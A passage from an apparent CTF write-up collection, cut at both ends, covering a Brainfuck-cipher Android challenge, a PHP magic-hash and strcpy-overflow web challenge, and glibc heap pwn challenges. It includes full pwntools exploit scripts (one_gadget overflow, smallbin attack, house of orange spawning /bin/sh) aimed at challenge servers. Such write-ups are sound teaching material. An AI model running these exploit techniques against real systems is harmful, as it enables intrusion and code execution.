78, 100, 36, 64],\n[100, 71, 39, 26, 74, 73, 83, 95, 62, 90, 8, 11, 77, 32, 19, 9, 23, 76, 62, 88],\n[6, 61, 69, 72, 84, 27, 18, 69, 14, 99, 20, 21, 13, 23, 42, 15, 32, 17, 73, 23],\n[20, 74, 49, 43, 63, 96, 4, 88, 84, 95, 36, 51, 89, 39, 2, 41, 77, 11, 22, 20],\n[41, 51, 11, 80, 0, 40, 26, 5, 11, 78, 60, 35, 53, 33, 69, 67, 0, 100, 39, 25],\n[28, 27, 3, 57, 64, 23, 68, 49, 26, 16, 20, 66, 58, 3, 51, 28, 39, 5, 56, 52],\n[41, 60, 51, 98, 40, 36, 50, 56, 79, 50, 57, 48, 52, 43, 66, 64, 8, 38, 65, 26],\n[65, 88, 53, 36, 29, 84, 21, 98, 92, 14, 94, 29, 42, 83, 45, 34, 44, 78, 44, 77],\n[78, 64, 92, 18, 39, 98, 46, 7, 60, 48, 31, 74, 40, 26, 70, 29, 23, 13, 100, 33],\n[38, 63, 66, 53, 7, 87, 70, 77, 51, 98, 100, 83, 75, 67, 7, 41, 63, 80, 45, 93],\n[18, 68, 76, 85, 6, 36, 24, 52, 57, 0, 4, 95, 88, 72, 46, 9, 84, 31, 22, 94],\n[99, 58, 9, 72, 28, 95, 11, 74, 2, 46, 45, 62, 10, 19, 97, 30, 91, 73, 83, 55],\n[100, 33, 92, 7, 60, 75, 30, 85, 62, 100, 47, 89, 14, 47, 73, 79, 92, 99, 52, 27],\n[25, 19, 3, 89, 29, 2, 14, 29, 42, 23, 88, 95, 76, 54, 1, 47, 77, 50, 50, 23],\n[100, 69, 71, 97, 72, 34, 41, 8, 35, 40, 91, 49, 54, 8, 20, 2, 15, 73, 77, 84],\n[46, 81, 51, 9, 98, 99, 47, 61, 38, 97, 60, 88, 63, 54, 30, 15, 57, 72, 60, 44],\n[32, 42, 30, 20, 56, 4, 35, 73, 13, 42, 64, 90, 81, 31, 82, 43, 91, 93, 4, 1],\n[55, 32, 51, 3, 32, 59, 84, 20, 96, 7, 99, 38, 3, 21, 80, 88, 50, 46, 34, 68],\n[70, 30, 76, 29, 33, 50, 95, 47, 11, 4, 96, 82, 91, 52, 68, 83, 28, 27, 89, 30],\n[25, 50, 25, 95, 78, 28, 1, 77, 62, 89, 0, 72, 38, 38, 33, 34, 75, 59, 18, 50],\n[6, 3, 59, 2, 15, 26, 93, 94, 2, 10, 44, 84, 41, 26, 90, 38, 30, 91, 18, 81],\n[73, 10, 81, 56, 75, 67, 17, 85, 77, 95, 0, 64, 68, 96, 100, 78, 76, 26, 2, 40],\n[95, 6, 77, 46, 9, 64, 77, 70, 98, 97, 55, 64, 35, 33, 75, 69, 42, 47, 4, 54],\n[3, 84, 94, 24, 59, 31, 69, 79, 80, 98, 84, 69, 77, 83, 96, 92, 25, 30, 7, 100],\n[80, 50, 2, 98, 22, 65, 36, 47, 81, 88, 20, 93, 12, 93, 69, 60, 41, 82, 17, 98],\n[27, 37, 4, 15, 29, 28, 49, 58, 81, 3, 71, 57, 87, 94, 59, 94, 41, 79, 28, 100],\n[39, 96, 87, 43, 21, 4, 27, 83, 73, 23, 90, 48, 92, 31, 7, 35, 50, 82, 94, 61],\n[78, 51, 45, 15, 55, 12, 19, 30, 16, 50, 4, 30, 39, 37, 54, 21, 72, 34, 45, 43],\n[72, 84, 91, 13, 68, 9, 41, 72, 75, 35, 32, 61, 43, 4, 63, 78, 52, 38, 17, 51],\n[20, 50, 87, 89, 15, 69, 95, 43, 38, 24, 96, 23, 62, 25, 0, 46, 14, 56, 63, 11],\n[68, 20, 74, 94, 54, 29, 99, 65, 23, 97, 10, 7, 49, 37, 87, 6, 57, 32, 73, 23],\n[40, 23, 89, 60, 39, 7, 69, 15, 13, 57, 65, 49, 8, 21, 70, 45, 9, 21, 32, 40]]\n\nres = [85050,91195,104053,74886,96859,78247,69704,93536,99410,91294,109711,85114,104598,118115,76597,91860,108325,86408,79996,92996,93246,71132,109941,99177,108060,107507,89876,95925,70342,90748,76100,90138,62864]\n\na = array(mat[:20])\nb = array(res[:20])\nx = linalg.solve(a, b)\n\nprint x\nprint ''.join(map(chr,[ 109,101, 32, 99, 97,110, 32,104, 97,122, 32,117,114, 32,102,108, 97,103,122, 63]))\n```\n\n`me can haz ur flagz?`\n\n## 997 Misc / Magician's spells ##\n\n**Description**\n\n> We managed to exfiltrate an android application from Wooble's employee. He called himself the magician, and, as per what we have read, left a secret to find for anyone who could discover it. We struggled with this for a while, and now we want to leave this one to you. Good luck.\n\n**Files provided**\n\n - [book.apk](files/book.apk)\n\n**Solution**\n\nFirst we need to decompile the APK; we can use an [online tool](http://www.javadecompilers.com/apk) to do this.\n\nWe can ignore a lot of third-party libraries and stuff for visual presentation and focus on these two classes:\n\n - [hackit.secretkeeper.altair.MainActivity](files/magician-main.java)\n - [hackit.secretkeeper.altair.Magix](files/magician-magix.java)\n\nIn `MainActivity` we see what happens to whatever we type into the text box:\n\n```java\n// output view\nTextView textView = (TextView) MainActivity.this.findViewById(C0323R.id.textView1);\n\n// input\nEditText editText = (EditText) MainActivity.this.findViewById(C0323R.id.editText1);\n\n// \"encryptor\" from the website?\nJSONObject jSONObject = new JSONObject(MainActivity.this.run(\"encryptor\"));\n\n// create a string from encryptor + input\nStringBuilder stringBuilder = new StringBuilder();\nstringBuilder.append(jSONObject.getString(\"p\"));\nstringBuilder.append(editText.getText());\n\n// use Magix to do \"magic\" on the created string using the \"encryptor\" result\nString encode = URLEncoder.encode(\n  new Magix(100000, new ByteArrayInputStream(\n    stringBuilder.toString().getBytes(StandardCharsets.UTF_8)\n  )).doMagic(jSONObject.getString(\"result\")),\n  \"utf-8\"\n);\n\n// send the magic output to the website as ?spell=<output>\nMainActivity mainActivity = MainActivity.this;\nStringBuilder stringBuilder2 = new StringBuilder();\nstringBuilder2.append(\"?spell=\");\nstringBuilder2.append(encode);\n\n// get result from the JSON output of the website\ntextView.setText(new JSONObject(mainActivity.run(stringBuilder2.toString())).getString(\"result\"));\n```\n\nFirst things first, `MainActivity.this.run(url)` requests data from a web site located at `http://185.168.131.121/`. If we look at the \"encryptor\" URL ourself, we get this result:\n\n```json\n{\n  \"result\": \"dzdakazzlzlkkkoczzzakkklzzzoczzzllllllllaokkkkkaozzlkkaozzozlkczzaozzzzlkkckkkkczzzaokkklzzzckkaozlkaozozlzzzzzczaozzzzzlzzckkkkkkkkczzaokklzzczzzaozzlkkczazaokozckaozlkcczaaockkkaozlzokkczaoklzclzlllllllaokaozzllkkczzaokklzzckckaozzzzlkkkkczzckkkczzzzzyaockkkkkkkkkkdc\",\n  \"p\": \"\\u0010\"\n}\n```\n\nNow let's have a look at `Magix`. The core is the `doMagic` function, which we can summarise as:\n\n```java\nprotected void doMagic(char c, char[] cArr) throws Exception {\n    switch (c) {\n        case 'a':\n        // ... if data at data pointer is zero, continue after the matching `c`\n        case 'c':\n        // ... jump back to matching `a`\n        case 'd':\n        // ... read a byte from user input and write at data pointer\n        case 'k':\n        // ... decrease data pointer (move to the left)\n        case 'l':\n        // ... increase value at data pointer\n        case 'o':\n        // ... decrease value at data pointer\n        case 'y':\n        // ... output byte at data pointer\n        case 'z':\n        // ... increase data pointer (move to the right)\n    }\n}\n```\n\nFamiliar at all?\n\nThis is a [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck) interpreter, with 100000 8-bit cells of memory, errors on out-of-bounds data access, and a modified character set:\n\n| Brainfuck | `Magix` | Function |\n| --- | --- | --- |\n| `>` | `z` | increase data pointer (move to the right) |\n| `<` | `k` | decrease data pointer (move to the left) |\n| `+` | `l` | increase value at data pointer |\n| `-` | `o` | decrease value at data pointer |\n| `.` | `y` | output byte at data pointer |\n| `,` | `d` | read a byte from user input and write at data pointer |\n| `[` | `a` | if data at data pointer is zero, continue at the matching `c` |\n| `]` | `c` | jump back to matching `a` |\n\nWe can try to reverse engineer what the \"encryptor\" code does, but reversing Brainfuck code is a very painfull process. Instead, we can write our own interpreter and see what it does for various inputs and outputs.\n\nWhatever string we give the encryptor, we get one of the same length, but the characters are all replaced. However, the same character in the input always corresponds to the same character in the output. And even better, the code is actually a symmetric cipher, so:\n\n```\nencryptor(\"\\u0010\" + encryptor(\"\\u0010\" + someText)) == someText\n```\n\n(The `\\u0010` byte is added by the application prior to encoding.)\n\nWhatever we encrypt then gets sent to the website, but for a lot of inputs the website simply responds with \"bad wolf\". With some luck, however, we can get an input like:\n\n```\ninput:          \"l\"\nencoded:        \"|\"\nwebsite output: \"||||||||||q\\x7Fs\"\ndecoded:        \"llllllllllaoc\"\n```\n\nThe code doesn't really do anything, but it's interesting that it increases the value at the data pointer to 10, i.e. the newline character. That made me think that when we run the code output by the website, it prints out the output of the command we tried.\n\nThe codes that the website accepts are actually only valid `Magix` codes, i.e. Brainfuck programs. So if our `Magix` code gets executed by the server, we can try out some options to get the flag:\n\n - dump (part of) the contents of the memory\n - dump memory to the left (assuming the data pointer was not at `0` to begin with)\n - read input characters and print them\n\nThe first two just displayed empty memory, but the third one worked:\n\n```\ninput:   \"dydydydydydydydydydydydydydydydydydydydydydydydydydydy\" ...\nencoded: \"tititititititititititititititititititititititititititi\" ...\nwebsite output:\n\"||||||||||qj||||||||||j|||||||||||j||||||||||||j|||||j||||||j|||||||||||||j{{{{{\"\n\"{{\\x7Fsj||ij\\x7F\\x7Fi{\\x7F\\x7F\\x7F\\x7F\\x7Fij\\x7F\\x7F\\x7F\\x7F\\x7Fij|||i{{|ijj\\x7F\"\n\"\\x7F\\x7F\\x7F\\x7F\\x7F\\x7F\\x7F\\x7Fi{{\\x7Fij||ij\\x7F\\x7F\\x7F\\x7Fi{\\x7F\\x7F\\x7Fij|||\"\n\"||||i{{||ij|||||i{\\x7F\\x7F\\x7F\\x7Fij\\x7F\\x7Fij\\x7F\\x7Fi{{ij|||||i|ij|i{{i||||||i\"\n\"j\\x7Fi{\\x7F\\x7Fijj\\x7F\\x7Fi|||||||i{||i||||i{||||||ij\\x7F\\x7F\\x7F\\x7F\\x7Fi\\x7Fi{\"\n\"\\x7F\\x7F\\x7F\\x7F\\x7F\\x7F\\x7F\\x7F\\x7F\\x7Fijjj\\x7Fij\\x7F\\x7F\\x7Fi{|i|iji{\\x7F\\x7F\"\n\"\\x7Fi||i\\x7Fi\\x7Fi|||iji{\\x7Fi|i\\x7F\\x7Fi{||||ijjjjiiiiiiiiiiiiiiiiiiiiiiiiiiiii\"\n\"iiiiiiiii\"\ndecoded:\n\"llllllllllazllllllllllzlllllllllllzllllllllllllzlllllzllllllzlllllllllllllzkkkkk\"\n\"kkoczllyzooykoooooyzoooooyzlllykklyzzoooooooooykkoyzllyzooooykoooyzlllllllykklly\"\n\"zlllllykooooyzooyzooykkyzlllllylyzlykkyllllllyzoykooyzzooylllllllykllyllllykllll\"\n\"llyzoooooyoykooooooooooyzzzoyzoooyklylyzykoooyllyoyoylllyzykoylyooykllllyzzzzyyy\"\n\"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy\"\n```\n\nAnd upon executing that last bit:\n\n`flag{brainfuck_is_not_encryption_19239021039231}`\n\n## 42 Web / BabyPeeHPee ##\n\n**Description**\n\n> Prove you are not a baby:\n> \n> http://185.168.130.148/\n\n**No files provided**\n\n**Solution**\n\n> (Note: write-up written without access to the original service. I tried to replicate the source as best as I could remember.)\n\nWe are presented with a PHP script giving us access to its source and a [`.so` file](files/auth.so) (shared object) it uses.\n\n```php\nyou may need [this](?source) or [this](auth.so).\n<?php\ninclude \"flag.php\";\n\nif (isset($_GET[\"source\"])) {\n  show_source(__FILE__);\n}\n\n$user = substr($_GET[\"u\"], 0, 20);\n$password = substr($_GET[\"p\"], 0, 45);\n\n$digest = @auth($user, $password);\n\nif (md5($user) == md5($digest) && $digest !== $user) {\n  echo $flag;\n}\n?>\n```\n\nThe script seems simple enough but clearly we need to understand the `auth` function, which is defined in the shared object. We can look at the function and decompile it with IDA:\n\n```c\nPhp::Parameters *__fastcall auth(Php::Parameters *a1, __int64 a2)\n{\n  __int64 v2; // rax\n  const char *v3; // rax\n  char dest; // [rsp+10h] [rbp-60h]\n  char v6[8]; // [rsp+30h] [rbp-40h]\n  unsigned __int64 v7; // [rsp+58h] [rbp-18h]\n  \n  v7 = __readfsqword(0x28u);\n  strcpy(v6, \"21232f297a57a5a743894a0e4a801fc3\");\n  v2 = std::vector<Php::Value,std::allocator<Php::Value>>::operator[](a2, 1LL);\n  v3 = (const char *)Php::Value::operator char const*(v2);\n  strcpy(&dest, v3);\n  Php::Value::Value(a1, v6, -1);\n  return a1;\n}\n```\n\nThe PHP wrappers are a bit confusing at first but essentially, `v2` gets set to the second argument given to the function, `v3` gets its C-string value, and that value is then `strcpy` copied into `dest`. [`strcpy`](https://linux.die.net/man/3/strcpy) (see \"Bugs\") is a big source of overflow vulnerabilities of course, and it is the same here. If the second argument given to `auth` is too long, i.e. more than 32 bytes, it will overflow into `v6` (since `v6` is right after `dest` on the stack).\n\nThe first argument given to `auth` is actually not used at all.\n\nWhat happens if we overflow into `v6`? We can cause the function to return a different value. It can be any short string of our choosing (the `$p` variable is still limited to 45 characters, minus the 32 needed to overflow into `dest`).\n\nSo, we need two values which are different but their MD5 digests are not? The condition seems to assert that, and it would mean that we need to find two relatively short strings that cause a MD5 collision. Some quick research shows that the shortest known pair like this is [64 bytes of binary data](https://stackoverflow.com/questions/1999824/whats-the-shortest-pair-of-strings-that-causes-an-md5-collision), which will not fit.\n\nLuckily, PHP is a bit weird, and the vulnerability is in this line:\n\n```php\nif (md5($user) == md5($digest) && $digest !== $user) {\n```\n\nThe MD5 digests are compared using the [equality operator `==`](https://secure.php.net/manual/en/language.operators.comparison.php), while the strings themselves are compared using the [not-identity operator `!==`](https://secure.php.net/manual/en/language.operators.comparison.php). Basically, the latter is type safe, while the former can sometimes compare variables in somewhat arbitrary ways.\n\nIn particular, strings can be interpreted as numbers in scientific notation. For this to happen, the string needs to be all numbers except for an `e`. As it turns out, MD5, or more specifically, the `md5` function in PHP, produces digests of 32 hexadecimal digits. It is possible that the digest for a certain string follows the scientific notation. It takes some time to brute-force out candidates like this, but it is possible.\n\nWith even more time, digests of even more specific formats can be found. If the digest starts with `0e`, followed by decimal digits only, e.g. `0e830400451993494058024219903391`, to PHP it looks like `0 * 10^830400451993494058024219903391`, which is zero in value!\n\nSo we need to provide two short strings that both give an MD5 digest starting with `0e` followed by decimal digits only. If you search for such an example, you may find this pair:\n\n```\nmd5(\"240610708\") === \"0e462097431906509019562988736854\"\nmd5(\"QNKCDZO\")   === \"0e830400451993494058024219903391\"\n```\n\nSo now we have all we need to exploit the website. We provide `240610708` as the username, and we put `QNKCDZO` in our password after 32 padding characters to make the digest be `QNKCDZO`:\n\n    http://185.168.130.148/?u=240610708&p=abcdabcdabcdabcdabcdabcdabcdabcdQNKCDZO\n\n`flag{here_is_a_warmup_chal_for_u_baby_}`\n\n## 741 Pwn / army ##\n\n**Description**\n\n> Welcome to the Army. Go get your promotion !!\n> \n> `nc 185.168.131.122 6000`\n\n**Files provided**\n\n - [army](files/army)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe problem is here in `create`\n\n```c\nv4 = malloc(v5);\nif ( v4 )\n{\n  printf(\"Enter your description: \", nptr);\n  v3 = (char *)malloc(v5);\n  read(0, v3, v5);\n  v7->descript = v3;\n  v7->des_len = v5;\n  g_des_len = v7->des_len;\n}\nelse\n{\n  puts(\"Malloc error\"); // logic problem\n  //return here\n}\n```\n\nIf the malloc fails, the `g_des_len` and `v7->des_len` are not updated, so they can have inconsistent value\n\nHowever, in `delete`\n\n```c\nsigned __int64 delete()\n{\n  int v1; // eax\n  void *v2; // rsp\n  __int64 v3; // [rsp+0h] [rbp-30h]\n  int v4; // [rsp+Ch] [rbp-24h]\n  void *buf; // [rsp+10h] [rbp-20h]\n  __int64 v6; // [rsp+18h] [rbp-18h]\n\n  if ( !if_created )\n    return 0LL;\n  v1 = me->des_len;\n  v6 = v1 - 1LL;\n  v2 = alloca(16 * ((v1 + 15LL) / 0x10uLL));    // 8 up\n  buf = &v3;\n  printf(\"Enter your answer : \", v1, (v1 + 15LL) % 0x10uLL, 16LL, v1, 0LL);\n  v4 = g_des_len;\n  read(0, buf, g_des_len);\n  puts(\"So trolled man, Imma demote you. Now you will be junior to your friends hahahaha so embarrasing.\");\n  free(me->name);\n  free(me->descript);\n  //...\n}\n```\n\nit uses `me->des_len` to do stack allocation but uses `g_des_len` as the size, so this could cause overflow, and there is no canary.\n\nThe way to control `g_des_len` is easy, it's just length of last description\n\nHow can we control `me->des_len`? well, the soldier struct will be allocated from 0x30 fastbin, and this will be the previous `me->name` if the length of descript is not 0x30 fastbin, which is contollable.\n\nPS: the `g_des_len` is `char`, but `me->des_len` is `int`; however, this does not seems to be exploitable.\n\nexp:\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\n\nONE_GADGET_OFF = 0x4526a\nif g_local:\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tsh = process('./army')#env={'LD_PRELOAD':'./libc.so.6'}\n\t#gdb.attach(sh)\nelse:\n\tsh = remote(\"185.168.131.122\", 6000)\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\t#ONE_GADGET_OFF = 0x4557a\n\ndef create(descrip, length):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Enter name: \")\n\tsh.send(\"1\\n\".ljust(0x23, \"\\x00\"))\n\tsh.recvuntil(\"Enter height: \")\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Enter weight: \")\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Enter length of answer: \")\n\tsh.send(str(length) + \"\\n\")\n\tif descrip:\n\t\tsh.recvuntil(\"Enter your description: \")\n\t\tsh.send(descrip)\n\tsh.recvuntil(\"3. I think I deserve a promotion\\n\")\n\ndef delete(answer):\n\tsh.send(\"3\\x00\\x00\\x00\")\n\tsh.send(answer)\n\tsh.recvuntil(\"3. I think I deserve a promotion\\n\")\n\nsh.recvuntil(\"Beginner's Luck : \")\nleak = sh.recvuntil(\"\\n\")\nlibc_addr = u64(leak[:len(leak)-1] + \"\\x00\\x00\") - e.symbols[\"puts\"]\nprint hex(libc_addr)\nsh.recvuntil(\"3. I think I deserve a promotion\\n\")\n\ncreate(\"123\", 0x7F)\ndelete(\"111\")\ncreate(None, -1)\nsh.send(\"3\\x00\\x00\\x00\" + (cyclic(56) + p64(libc_addr + ONE_GADGET_OFF)).ljust(0x7F, \"\\x00\"))\nsh.interactive()\n```\n\n## 954 Pwn / A Heap Interface ##\n\n**Description**\n\n> This heap interface is really cool. We ask our clients to submit PoW to use this.\n> \n> UPDATE : We removed PoW, please don't try to brute more than 4 bits.\n> \n> `nc 185.168.131.133 6000`\n\n**Files provided**\n\n - [libc-2.24.so](files/libc-2.24.so)\n - [heap_interface](files/heap_interface)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe program is simple, typical UAF but without show, and house of roman that requires 12-bit bruteforce is not allowed.\n\nThe potential leak is here, \n\n```c\nint printfname()\n{\n  return printf(\"Name: %s\\n\", name);\n}\n```\n\nand the name is not null terminated. According to the memory layout, the buffer pointers are just after the name, so we can leak the address of heap directly.\n\nHowever, we need to leak libc, so we want the allocation to be allocated in libc. Fastbin attack is not possible, because the size is restricted to be larger than fastbin size, so what we can do is [smallbin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_lore.c). In this way we need to fake a smallbin in libc first.\n\nInitially I would like to use `scanf`, since this will write data in the `_IO_buf_base` field of stdin, which is in libc, but the program will get into a infinite loop as long as we input non-digit character for scanf.\n\nAlternatively, I tried to fake such smallbin chunk in fastbin field of `main_arena`. Firstly we need to manipulate the heap and utilize [house of spirit](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_spirit.c) to fake a fastbin chunk and free it into fastbin linked list table in `main_arena`. Then continue to manipulate heap to satisfy the precondition required by small bin attack. Also, I use partial rewrite to write 1 least significant byte of `bk` of victim small bin(this is very close to our faked chunk) and let the smallbin chunk's `bk` to point to our faked smallbin chunk in fastbin of `main_arena`. Then we can call `malloc` and get an address in libc, so if we put this to index 0, we can leak the libc.\n\nAfter leaking libc, things become easy, use house of orange attack to getshell\n\nexp:\n\n```python\nfrom pwn import *\n\ng_local=False\ncontext.log_level='debug'\n\nif g_local:\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tsh = process('./heap_interface')#env={'LD_PRELOAD':'./libc.so.6'}\n\tONE_GADGET_OFF = 0x4526a\n\tFAKE_CHUNK_LSB = 0x28\n\tIO_STR_FINISH = 0x3c37b0\n\t#gdb.attach(sh)\n\tFAKE_CHUNK_OFF = 0x3c4b38\nelse:\n\tsh = remote(\"185.168.131.133\", 6000)\n\te = ELF(\"./libc-2.24.so\")\n\tFAKE_CHUNK_LSB = 0x08\n\tONE_GADGET_OFF = 0x4557a\n\tIO_STR_FINISH = 0x394510\n\tFAKE_CHUNK_OFF = 0x3c4b18\n\ndef mymalloc(size, idx):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Enter size of chunk :\")\n\tsh.send(str(size) + \"\\n\")\n\tsh.recvuntil(\"Enter index :\")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"4. Show info\\n\")\n\ndef myfree(idx):\n\tsh.send(\"3\\n\")\n\tsh.recvuntil(\"Enter index :\")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"4. Show info\\n\")\n\ndef mywrite(idx, data):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Enter index of chunk :\")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"Enter data :\")\n\tsh.send(data)\n\tsh.recvuntil(\"4. Show info\\n\")\n\ndef showname():\n\tsh.send(\"4\\n\")\n\tsh.recvuntil(\"Name: \" + \"A\" * 0x20)\n\tret = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"4. Show info\\n\")\n\treturn ret[:len(ret)-1]\n\nsh.send(\"A\" * 0x20)\nsh.recvuntil(\"4. Show info\\n\")\n\n#----------------leak heap\nmymalloc(0x100, 0)\nheap_addr = u64(showname() + \"\\x00\\x00\") - 0x10\nprint hex(heap_addr)\nmyfree(0)\n\n#----------------small bin attack\n# fake_chunk_1[0] = 0;\n# fake_chunk_1[1] = 0;\n# fake_chunk_1[2] = victim_chunk; # at 0x90 chunk smallbin\n# fake_chunk_1[3] = (intptr_t*)fake_chunk_2;\n# fake_chunk_2[2] = (intptr_t*)fake_chunk_1;\n\n# fake the fake chunk in the fastbin\n\nmymalloc(0x80, 0)\nmymalloc(0x180, 1) # this will cover 2\nmyfree(0)\nmyfree(1)\nmymalloc(0x90, 0)\nmymalloc(0x80, 2) # victim chunk\nmyfree(0)\nmyfree(2)\nmymalloc(0x1F0, 0) # control first 0x200 chunk\n#0 1 2 used to prepare victim chunk in fastbin\n\nmymalloc(0x80, 3)\nmymalloc(0x180, 4) # this will cover 5\nmyfree(3)\nmyfree(4)\nmymalloc(0x90, 3)\nmymalloc(0x80, 5)\nmyfree(3)\nmyfree(5)\nmymalloc(0x1F0, 3) # control first 0x200 chunk\n#3 4 5 used to prepare fake_chunk_2 chunk in fastbin\n\n#topchunk 400\n\nmywrite(1, p64(0) + p64(0x41) + 'A' * 0x38 + p64(0x41))\nmywrite(4, p64(0) + p64(0x51) + 'B' * 0x48 + p64(0x51))\nmyfree(2)\nmyfree(5)\n#fake the fake chunk1\n\nmywrite(4, p64(0) + p64(0x91) + 'C' * 0x88 + p64(0x21) + 'D' * 0x18 + p64(0x21))\nmyfree(5)\nmymalloc(0x80, 6)\nmywrite(5, chr(FAKE_CHUNK_LSB)) # fake_chunk_2[2] = (intptr_t*)fake_chunk_1;\n#now 0x40 0x50 fastbin, others empty\n\nmywrite(1, p64(0) + p64(0x91) + 'C' * 0x88 + p64(0x21) + 'D' * 0x18 + p64(0x21))\nmyfree(2)\n\nmymalloc(0x100, 7) #put to smallbin\n\nmywrite(2, p64(1) + chr(FAKE_CHUNK_LSB))\nmymalloc(0x80, 8)\nmymalloc(0x80, 0)\n\nlibc_addr = u64(showname() + \"\\x00\\x00\") - FAKE_CHUNK_OFF\nprint hex(libc_addr)\n#smallbin broken for 0x90\n\n\n#house of orange---------------------\n\nfake_file = p64(0)\nfake_file += p64(0x61)\nfake_file += p64(1)\nfake_file += p64(libc_addr + e.symbols[\"_IO_list_all\"] - 0x10)\nfake_file += p64(2) + p64(3)\nfake_file += \"\\x00\" * 8\nfake_file += p64(libc_addr + next(e.search('/bin/sh\\x00'))) #/bin/sh addr\nfake_file += (0xc0-0x40) * \"\\x00\"\nfake_file += p32(0) #mode\nfake_file += (0xd8-0xc4) * \"\\x00\"\nfake_file += p64(libc_addr + IO_STR_FINISH - 0x18) #vtable_addr\nfake_file += (0xe8-0xe0) * \"\\x00\"\nfake_file += p64(libc_addr + e.symbols[\"system\"])\n\nmymalloc(0x90, 9)\nmymalloc(0x100, 11)\nmymalloc(0x100, 14)\n#if no this padding, consolidate will cause SIG_BUS?\nmyfree(9)\nmyfree(11)\nmymalloc(0xA0, 10)\nmymalloc(0xF0, 12)\nmymalloc(0x90, 13)\nmyfree(12)\n\nmywrite(11, fake_file)\nmymalloc(400, 15)\n\nsh.interactive()\n```\n\nHowever, the flag is `flag{gl0bal_m4x_fastb1n_atta3k_OMG_too_kewl}`, which is different from my solution since I didn't attack `global_max_fast`\n\n## 982 Pwn / Bank Reimplemented ##\n\n**Description**\n\n> We learnt from our past mistakes. We now have cameras looking at `__malloc_hook` 24x7.\n> \n> `nc 185.168.131.144 6000`\n\n**Files provided**\n\n - [chall2-bank](files/chall2-bank)\n - [libc-2.24.so](files/libc-2.24.so)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe problem is here. When creating the back account, there is a off-by-one.\n\n```c\nread(0, v3->title, 0x11uLL);           // off by one\n```\n\nThe insight is to change the size of unsorted bin and then create an overlap. However, only fastbin size is allowed, so we  must use this off-by-one to increase the size of a currently using fastbin chunk into a unsorted bin chunk, so when we free it it will be putted into unsorted bin. To create such situation, we need to manipulate the fastbin chunks first.\n\nAfter creating such overlapped unsorted bin, we can leak program address and libc address. Care has to be taken about the check for the `flag` field in the struct, which should point to `0x60C0C748`. (e.i. do not change it)\n\nThen we need to control the `rip`, but since the in `edit statement` function, `fgets` instead of `fread` is used, so there must be a null termination, so we can't rewrite return address in stack (we can only write 5 non-zero bytes but all addresses are 6 bytes).\n\n```c\nif ( v1 >= 0 && v1 <= 19 && accounts[v1] )\n{\n  n = strlen(accounts[v1]->statement);\n  fgets(accounts[v1]->statement, n, stdin);\n}\n```\n\nThus, I used house of orange attack, which can be acheived by setting the `title_size` field to a big number by using overlap. But to make it simple, set `global_max_fast` to zero first.\n\nexp:\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\n\nif g_local:\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tsh = process('./chall2-bank')#env={'LD_PRELOAD':'./libc.so.6'}\n\tUNSORTED_OFF = 0x3c4b78\n\tGLOBAL_MAX_FAST = 0x3C67F8\n\tIO_STR_FINISH = 0x3c37b0\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"185.168.131.144\", 6000)\n\te = ELF(\"./libc-2.24.so\")\n\tUNSORTED_OFF = 0x397b58\n\tGLOBAL_MAX_FAST = 0x3997D0\n\tIO_STR_FINISH = 0x394510\n\ndef slp():\n\tif g_local:\n\t\tsleep(0.1)\n\telse:\n\t\tsleep(1)\n\ndef create(title, size, statement):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"Enter title of bank account: \")\n\tsh.send(title)\n\tsh.recvuntil(\"Enter size of your bank statement: \")\n\tsh.send(str(size) + \"\\n\")\n\tslp()\n\tsh.send(statement + \"\\n\")\n\tsh.recvuntil(\"Account has been created at index \")\n\tret = int(sh.recvuntil(\"\\n\"))\n\tsh.recvuntil(\"5. View your bank status\\n\")\n\treturn ret\n\ndef edit_title(idx, title):\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Enter index of bank account: \")\n\tsh.send(str(idx) + \"\\n\")\n\tslp()\n\tsh.send(title)\n\tsh.recvuntil(\"5. View your bank status\\n\")\n\ndef edit_statement(idx, statement):\n\tsh.send(\"3\\n\")\n\tsh.recvuntil(\"Enter index of bank account: \")\n\tsh.send(str(idx) + \"\\n\")\n\tslp()\n\tsh.send(statement + \"\\n\")\n\tsh.recvuntil(\"5. View your bank status\\n\")\n\ndef delete(idx):\n\tsh.send(\"4\\n\")\n\tsh.recvuntil(\"Enter index of bank account: \")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"5. View your bank status\\n\")\n\ndef view(idx):\n\tsh.send(\"5\\n\")\n\tsh.recvuntil(\"Enter index of bank account: \")\n\tsh.send(str(idx) + \"\\n\")\n\tsh.recvuntil(\"Title: \")\n\ttitle = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"Statement: \")\n\tstatement = sh.recvuntil(\"\\n\")\n\tsh.recvuntil(\"5. View your bank status\\n\")\n\treturn (title[:len(title)-1],statement[:len(statement)-1])\n\ntmp1 = create(\"1\", 0x20, \"1\")\ntmp2 = create(\"2\", 0x20, \"2\")\ndelete(tmp1)\ndelete(tmp2)\n#now 4 0x30 fastbin, ordered by 6903\n\nfst4_0x30 = [0] * 4\nfor i in map(lambda x:x/3,[6,9,0,3]):\n\tfst4_0x30[i] = create(str(i), 0x50, str(i))\n#consume the 0x30 chunks, put them in an array,\n#idx correspond to memory position\n\n#want allocation order 31 